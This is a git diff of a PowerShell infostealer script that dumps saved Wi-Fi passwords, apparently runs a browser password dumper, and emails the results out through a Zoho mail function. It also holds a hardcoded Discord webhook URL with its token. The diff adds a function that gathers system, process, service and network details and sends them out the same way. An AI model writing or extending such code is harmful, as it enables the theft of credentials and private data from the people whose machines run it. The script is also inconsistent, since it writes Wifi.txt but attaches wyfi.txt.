@@ -1,4 +1,7 @@
 $global:isEmailSent = $false
+$webhookUrl = 'https://discord.com/api/webhooks/1297712924281798676/ycVfil-FoOVqAlTxZrp-2aHo8O9eJlCZg8rR279cu7oGwCh-kdq5GxxliUQMVneIkxDX'
+$totalSteps = 4
+$currentDateTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
 function SetEmailSentTrue {$global:isEmailSent = $true}
 function SetEmailSentFalse {$global:isEmailSent = $false}
 function Send-ZohoEmail {
@@ -200,10 +203,8 @@ function GetWifiPasswords {
     # Save results to a file
     $results | Out-File -FilePath "$env:TEMP\Wifi.txt"
 
-
     # Email file
     if (-not $isEmailsent) {
-        # Email parameters
         $subject = "Netsh Profiles - Sent on $currentDateTime"
         $attachments = @("$env:TEMP\wyfi.txt")  # Array of attachment file paths
         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
@@ -245,11 +246,24 @@ function GetWifiPasswords {
     Remove-Item "$env:TEMP\wyfi.txt" -Force -ErrorAction SilentlyContinue
     SetEmailSentFalse
 }
+function GatherSystemInfo {
+    $sysInfoDir = "$env:TEMP\SystemInfo"
+    if (-Not (Test-Path $sysInfoDir)) {
+        New-Item -ItemType Directory -Path $sysInfoDir
+    }
 
-$webhookUrl = 'https://discord.com/api/webhooks/1297712924281798676/ycVfil-FoOVqAlTxZrp-2aHo8O9eJlCZg8rR279cu7oGwCh-kdq5GxxliUQMVneIkxDX'
+    Get-ComputerInfo | Out-File -FilePath "$sysInfoDir\computer_info.txt"
+    Get-Process | Out-File -FilePath "$sysInfoDir\process_list.txt"
+    Get-Service | Out-File -FilePath "$sysInfoDir\service_list.txt"
+    Get-NetIPAddress | Out-File -FilePath "$sysInfoDir\network_config.txt"
 
-$totalSteps = 4
-$currentDateTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    if (-not $isEmailsent) {
+        $subject = "System Info - Sent on $currentDateTime"
+        $attachments = @("$sysInfoDir\computer_info.txt","$sysInfoDir\process_list.txt","$sysInfoDir\service_list.txt","$sysInfoDir\network_config.txt")  # Array of attachment file paths
+        Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+    }
+
+}
 
 for ($step = 1; $step -le $totalSteps; $step++) {
     # Perform your operation here
@@ -257,7 +271,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
 
         1 { RunWBPV }
         2 { GetWifiPasswords }
-        3 { }
+        3 { GatherSystemInfo }
         4 { }
     }
 }
